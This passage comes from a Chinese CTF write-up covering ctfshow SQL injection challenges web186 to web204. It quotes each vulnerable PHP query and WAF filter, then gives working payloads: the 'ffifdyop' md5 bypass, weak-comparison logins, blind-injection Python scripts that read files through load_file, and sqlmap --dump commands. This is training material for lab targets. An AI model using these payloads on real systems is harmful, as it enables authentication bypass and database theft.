class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="41"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><h4 id="web-186-过滤注入-布尔盲注-构造数字2"><a class="anchor" href="#web-186-过滤注入-布尔盲注-构造数字2">#</a> web 186 过滤注入 - 布尔盲注 - 构造数字 2</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span>     </pre></td></tr><tr><td data-num="9"></td><td><pre>查询结果</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>同用上一题脚本。</p>
<h4 id="web-187-过滤注入-md5passtrue绕过"><a class="anchor" href="#web-187-过滤注入-md5passtrue绕过">#</a> web 187 过滤注入 - md5 ($pass,true) 绕过</h4>
<pre><code class="language-xml-dtd">md5($_POST['password'],true);老面孔了用户名填写admin密码为ffifdyop   相当于万能密码永真
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// 只有 admin 可以获得 flag</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名不存在'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload    登陆成功抓包</p>
<pre><code class="language-xml-dtd">username=admin
password=ffifdyop
</code></pre>
<h4 id="web-188-过滤注入-mysql的弱比较"><a class="anchor" href="#web-188-过滤注入-mysql的弱比较">#</a> web 188 过滤注入 - MYSQL 的弱比较</h4>
<pre><code>在where username=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来。php里面常见的intval()函数的绕过，password应该是字符开头的数据，字符串会变0来进行这种弱比较，所以password也为0就行。
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token comment">// 用户名检测</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 密码检测</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">// 密码判断</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTg4ODMyMTMvd2h5LXNlbGVjdC1mcm9tLXRhYmxlLXdoZXJlLXVzZXJuYW1lLTAtc2hvd3MtYWxsLXJvd3MtdXNlcm5hbWUtY29sdW1uLWlzLXY=">mysql 弱类型比较</span></p>
<p>payload</p>
<pre><code class="language-xml-dtd">username=0&amp;password=0
username=1||1&amp;password=0
</code></pre>
<h4 id="web-189-过滤注入-load_file结合regexp盲注"><a class="anchor" href="#web-189-过滤注入-load_file结合regexp盲注">#</a> web 189 过滤注入 - load_file<strong> 结合</strong> regexp 盲注</h4>
<pre><code class="language-xml-dtd">load_file()函数读取一个文件并将其内容作为字符串返回。
①有读取文件的权限 r
and (select count(*) from mysql.user)&gt;0
如果返回正常则说明有权限，反之没有
②文件大小不能超过max_allowed_packet
③secure_file_priv的值不为NULL
查看mysql是否有对函数load_file(),outfile()函数的限制(securefilepriv的值是否为NULL)
④必须给出绝对路径

regexp： mysql中的正则表达式操作符
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>hint：flag在api<span class="token operator">/</span>index<span class="token operator">.</span>php文件中</pre></td></tr><tr><td data-num="2"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token comment">// 用户名检测</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token comment">// 密码检测</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// 密码判断</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="3"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://ec75b2fc-d899-4c4d-8e02-76137722e105.challenge.ctf.show/api/index.php'</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('&#123;&#125;'),1,0)"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>string <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span><span class="token string">'-&#123;&#125;'</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u5931\u8d25"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><h4 id="web-190-过滤注入-bool盲注"><a class="anchor" href="#web-190-过滤注入-bool盲注">#</a> web 190 过滤注入 - bool 盲注</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>      </pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 密码检测</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 密码判断</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">//TODO: 感觉少了个啥，奇怪</span></pre></td></tr></table></figure><h4 id="web201-sqlmap-agentreferer"><a class="anchor" href="#web201-sqlmap-agentreferer">#</a> web201 sqlmap agent,referer</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span>dump 转储数据库表的记录</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span>dump<span class="token operator">-</span>all 转储数据库的所有表记录，俗称脱裤</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span>roles 枚举数据库的所有用户角色</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span>dbs 枚举数据库的所有数据库</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">--</span>tables 枚举数据库的所有表</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">--</span>columns 枚举数据库的所有列</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">-</span><span class="token constant">D</span> <span class="token constant">DB</span> 指定要枚举的数据库名称</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">-</span><span class="token constant">T</span> <span class="token constant">TBL</span> 指定要枚举的表名称</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">-</span><span class="token constant">C</span> <span class="token constant">COL</span> 指定要枚举的列名称</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">--</span>dbms<span class="token operator">=</span><span class="token constant">DBMS</span> 指定注入地址的后台数据库名称</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">-</span>v <span class="token constant">VERBOSE</span> 显示测试细节 默认数字<span class="token number">1</span><span class="token operator">-</span><span class="token number">6</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">--</span>user<span class="token operator">-</span>agent<span class="token operator">=</span><span class="token constant">AGENT</span> 设置<span class="token constant">HTTP</span> User<span class="token operator">-</span>Agent 的值</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">--</span>referer<span class="token operator">=</span><span class="token constant">REFERER</span> 设置 <span class="token constant">HTTP</span> Referer 的值</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 使用 --user-agent 指定 agent</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 使用 --referer 绕过 referer 检查</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//36a79487-468f-4a88-ad48-9a4f857ee4cf.challenge.ctf.show/api/?id=1 --referer=ctf.show --user-agent=sqlmap -D ctfshow_web -T ctfshow_user -C pass --dump</span></pre></td></tr></table></figure><h4 id="web202-sqlmap-data"><a class="anchor" href="#web202-sqlmap-data">#</a> web202 sqlmap --data</h4>
<pre><code>--data=数据 通过POST发送数据字符串，例如: --data=&quot;id=1&quot;
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//5b4d7574-3855-46e0-b894-152d01b7f3e9.challenge.ctf.show/api/ --data="id=1" --referer=ctf.show --user-agent=sqlmap -D ctfshow_web -T ctfshow_user -C pass --dump</span></pre></td></tr></table></figure><h4 id="web203-sqlmap-method"><a class="anchor" href="#web203-sqlmap-method">#</a> web203 sqlmap --method</h4>
<pre><code>--method=方法 强制使用指定的方式进行连接，例如 PUT,GET,POST,HEAD,OPTIONS,DELETE
--headers=HEADERS 设置多个HTTP头 例如：Accept-Language: fr\nETag: 123    &quot;Content-Type: text/plain&quot; 
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>paylaod</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//ae32f519-2ddb-46fc-bf22-01988f588fa9.challenge.ctf.show/api/index.php --data="id=1" --method=PUT --headers="Content-Type: text/plain" --level=3 -D ctfshow_web -T ctfshow_user -C pass --dump</span></pre></td></tr></table></figure><h4 id="web204-sqlmap-cookie"><a class="anchor" href="#web204-sqlmap-cookie">#</a> web204 sqlmap --cookie</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span>level<span class="token operator">=</span><span class="token constant">LEVEL</span> 指定注入测试级别 例如：<span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> 默认 <span class="token number">1</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span>risk<span class="token operator">=</span><span class="token constant">RISK</span> 指定注入测试风险等级，防止破坏数据 例如：<span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> 默认 <span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>sqlmap <span class="token operator">-</span>u <span class="token string double-quoted-string">"url"</span> <span class="token operator">--</span>level<span class="token operator">=</span><span class="token constant">LEVEL</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">1.</span>使用哪些payload也影响注入点的选择。</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">2.</span><span class="token constant">GET</span><span class="token operator">/</span><span class="token constant">POST</span>都会测试<span class="token punctuation">,</span>level <span class="token number">2</span>时，会测试cookie，level <span class="token number">3</span>时，会测试User<span class="token operator">-</span>Agent和Referer。</pre></td></tr><tr><td 